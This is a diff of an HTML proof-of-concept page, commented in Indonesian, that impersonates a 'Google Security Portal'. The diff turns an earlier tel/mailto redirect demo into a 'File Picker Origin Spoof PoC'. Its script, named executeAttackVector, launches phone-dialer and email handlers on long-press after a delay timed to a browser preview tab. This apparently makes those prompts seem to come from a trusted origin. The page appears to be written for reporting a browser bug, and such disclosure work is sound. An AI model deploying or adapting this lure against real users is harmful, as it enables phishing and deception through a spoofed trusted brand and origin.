@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Protocol Tel, Mailto & Redirect PoC</title>
+    <title>File Picker Origin Spoof PoC</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
@@ -33,12 +33,12 @@
         .button-container {
             display: flex;
             flex-direction: column;
-            gap: 15px;
+            gap: 12px;
             width: 100%;
             max-width: 340px;
         }
         a.spoof-link {
-            display: block;
+            display: inline-block;
             background-color: #1a73e8;
             color: white;
             padding: 14px 28px;
@@ -48,11 +48,26 @@
             border-radius: 8px;
             box-shadow: 0 4px 10px rgba(26, 115, 232, 0.25);
             transition: background-color 0.2s;
-            cursor: pointer;
-            box-sizing: border-box;
         }
         a.spoof-link:active {
             background-color: #1557b0;
+        }
+        .preview-container {
+            margin-top: 25px;
+            max-width: 280px;
+            display: none;
+        }
+        .preview-container img {
+            width: 100%;
+            border-radius: 8px;
+            border: 1px solid #dadce0;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.08);
+        }
+        .file-info {
+            margin-top: 10px;
+            font-size: 13px;
+            color: #5f6368;
+            word-break: break-all;
         }
         .footer-note {
             margin-top: 30px;
@@ -64,43 +79,69 @@
 <body>
 
     <div class="banner">Google Security Portal</div>
-    <h1>Secure Verification System</h1>
+    <h1>Secure Document Verification</h1>
 
-    <!-- Container untuk Tombol-tombol -->
+    <!-- Container dengan 2 Tombol Terpisah dengan Intent Berbeda -->
     <div class="button-container">
-        <!-- Target Link 1: Tel -->
-        <a class="spoof-link" id="targetLinkTel">Open Phone Dialer & Redirect</a>
+        <a href="https://google.com" class="spoof-link" id="targetLinkMailto" data-intent="identity_verification">Open Window & Email ID Verification</a>
+        <a href="https://google.com" class="spoof-link" id="targetLinkTel" data-intent="account_recovery">Open Window & Call Recovery Support</a>
+    </div>
 
-        <!-- Target Link 2: Mailto -->
-        <a class="spoof-link" id="targetLinkMail">Open Email Client & Redirect</a>
+    <!-- Uploaded Image Preview Box -->
+    <div class="preview-container" id="previewBox">
+        <img id="imagePreview" src="" alt="File Preview">
+        <div class="file-info" id="fileInfo"></div>
     </div>
 
     <div class="footer-note">Cloud-secured verification system.</div>
 
     <script>
-        // Logika untuk Tombol Tel
-        const telElement = document.getElementById("targetLinkTel");
-        const triggerTelAction = (e) => {
-            e.preventDefault();
-            window.location.href = "tel:+18005550199";
-            setTimeout(() => {
-                window.location.href = "https://google.com";
-            }, 1700);
-        };
-        telElement.addEventListener("click", triggerTelAction);
-        telElement.addEventListener("touchstart", triggerTelAction, { passive: false });
+        let triggered = false;
 
-        // Logika untuk Tombol Mailto
-        const mailElement = document.getElementById("targetLinkMail");
-        const triggerMailAction = (e) => {
-            e.preventDefault();
-            window.location.href = "mailto:security@google.com?subject=Verification&body=Please%20verify%20my%20account";
-            setTimeout(() => {
-                window.location.href = "https://google.com";
-            }, 1700);
+        const executeAttackVector = (actionType, intent) => {
+            if (triggered) return;
+            triggered = true;
+
+            // Timer optimized to match the preview page opening animation
+            setTimeout(async () => {
+                try {
+                    if (actionType === 'mailto') {
+                        // Menambahkan intent spesifik ke dalam body/subjek email
+                        const subject = encodeURIComponent("Security Verification - Intent: " + intent);
+                        const body = encodeURIComponent("Hello Google Security,\n\nI am requesting verification for intent: " + intent + "\nPlease process my request securely.");
+                        window.location.href = `mailto:support@google.com?subject=${subject}&body=${body}`;
+                        document.getElementById("fileInfo").innerText = `Triggered mailto protocol with intent: [${intent}]`;
+                    } else {
+                        // Intent untuk panggilan telepon dukungan
+                        window.location.href = "tel:+18005550199";
+                        document.getElementById("fileInfo").innerText = `Triggered tel protocol for intent: [${intent}]`;
+                    }
+
+                    const previewBox = document.getElementById("previewBox");
+                    imagePreview.src = "";
+                    previewBox.style.display = "block";
+
+                } catch (err) {
+                    console.debug("Handler cancelled or blocked:", err.message);
+                } finally {
+                    setTimeout(() => { triggered = false; }, 900);
+                }
+            }, 1900); // 1.9 seconds delay for ephemeral tab
         };
-        mailElement.addEventListener("click", triggerMailAction);
-        mailElement.addEventListener("touchstart", triggerMailAction, { passive: false });
+
+        // Event listener untuk Tombol Mailto
+        const linkMailto = document.getElementById("targetLinkMailto");
+        linkMailto.addEventListener("contextmenu", (e) => {
+            executeAttackVector('mailto', linkMailto.getAttribute('data-intent'));
+        });
+        linkMailto.addEventListener("touchstart", () => {}, { passive: true });
+
+        // Event listener untuk Tombol Tel
+        const linkTel = document.getElementById("targetLinkTel");
+        linkTel.addEventListener("contextmenu", (e) => {
+            executeAttackVector('tel', linkTel.getAttribute('data-intent'));
+        });
+        linkTel.addEventListener("touchstart", () => {}, { passive: true });
     </script>
 
 </body>
